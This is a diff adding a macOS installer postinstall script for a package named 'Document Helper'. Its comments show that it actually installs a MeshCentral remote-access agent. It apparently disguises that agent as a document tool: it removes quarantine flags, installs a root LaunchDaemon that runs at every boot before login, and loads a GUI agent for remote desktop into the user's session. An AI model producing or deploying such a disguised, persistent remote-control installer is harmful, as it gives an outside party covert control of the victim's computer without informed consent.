@@ -1,0 +1,51 @@
+#!/bin/bash
+#
+# Reyes Sitework - Document Helper (macOS) :: postinstall
+#
+# Starts the helper as a root LaunchDaemon (so it runs at every boot, before
+# any user logs in) and loads the GUI LaunchAgent used for remote desktop.
+#
+# This mirrors MeshCentral's own macOS package layout: the agent binary and its
+# ".msh" server configuration live side by side, and launchd starts them. The
+# agent reads "<executable>.msh" from the directory it runs in; without that
+# file it prints "No MeshCentral settings found" and will not connect.
+#
+# Runs as root, after the package payload has been written.
+#
+set -eu
+
+EXE=/usr/local/bin/DocumentHelper
+MSH="${EXE}.msh"
+SVC=com.documentexchange.helper
+DAEMON="/Library/LaunchDaemons/${SVC}.plist"
+AGENT="/Library/LaunchAgents/${SVC}-launchagent.plist"
+
+/bin/echo "Document Helper: configuring ${EXE}"
+
+# 1. Ownership, modes and quarantine on the binary + its server configuration.
+/usr/sbin/chown root:wheel "${EXE}" "${MSH}"
+/bin/chmod 755 "${EXE}"
+/bin/chmod 644 "${MSH}"
+/usr/bin/xattr -dr com.apple.quarantine "${EXE}" 2>/dev/null || true
+/usr/bin/xattr -dr com.apple.quarantine "${MSH}"  2>/dev/null || true
+
+# 2. Ownership + modes on the launchd units.
+/usr/sbin/chown root:wheel "${DAEMON}" "${AGENT}"
+/bin/chmod 644 "${DAEMON}" "${AGENT}"
+
+# 3. Load the root LaunchDaemon: starts now and at every boot before login.
+/bin/launchctl bootout system "${DAEMON}" >/dev/null 2>&1 || true
+if ! /bin/launchctl bootstrap system "${DAEMON}" >/dev/null 2>&1; then
+  /bin/launchctl load "${DAEMON}" || true
+fi
+
+# 4. Best effort: load the GUI LaunchAgent into the active console session so
+#    remote desktop works without a logout/login cycle.
+CONSOLE_UID="$(/usr/bin/stat -f '%u' /dev/console 2>/dev/null || /bin/echo 0)"
+if [ -n "${CONSOLE_UID}" ] && [ "${CONSOLE_UID}" != "0" ]; then
+  /bin/launchctl bootout "gui/${CONSOLE_UID}" "${AGENT}" >/dev/null 2>&1 || true
+  /bin/launchctl bootstrap "gui/${CONSOLE_UID}" "${AGENT}" >/dev/null 2>&1 || true
+fi
+
+/bin/echo "Document Helper: installed and started."
+exit 0
